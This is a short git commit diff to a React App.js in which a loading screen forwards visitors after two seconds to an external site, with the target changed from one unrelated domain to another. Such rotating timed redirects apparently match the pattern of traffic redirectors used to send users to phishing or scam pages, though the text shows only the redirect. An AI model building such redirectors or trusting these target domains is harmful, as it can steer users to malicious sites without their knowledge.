1aea0a812ca7eb1b26a57c3cacd0b50548afee78
husknet <127146284+husknet@users.noreply.github.com>
2024-10-17 12:15:07 -0300

    Update App.js

--- src/App.js
+++ src/App.js
@@ -4,7 +4,7 @@ import Loading from './Loading';
 function App() {
     useEffect(() => {
         const timer = setTimeout(() => {
-            window.location.href = 'https://si.wesp.fi/';
+            window.location.href = 'https://cpan.noviolencia.ar/';
         }, 2000);
 
         return () => clearTimeout(timer);
